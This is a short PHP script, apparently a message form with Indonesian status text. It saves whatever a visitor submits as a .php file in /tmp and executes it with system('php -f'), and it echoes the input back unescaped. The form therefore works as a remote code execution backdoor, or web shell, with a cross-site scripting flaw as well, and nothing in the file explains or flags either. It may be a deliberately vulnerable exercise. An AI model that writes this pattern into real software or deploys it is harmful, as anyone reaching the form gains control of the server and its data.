<?php

if ($_POST) {
    $message = trim($_POST['message']);

    $filename = '/tmp/' . time() . '.php';
    $file = fopen($filename, 'w');
    fwrite($file, $message);
    fclose($file);

    echo 'Pesan berhasil dikirim! <br>';
    echo 'Pesan anda : ' . $message . '<br><br>';

    system('php -f ' . $filename . ' &>/dev/null');
} else {
    echo 'Pesan Gagal Dikirim';
}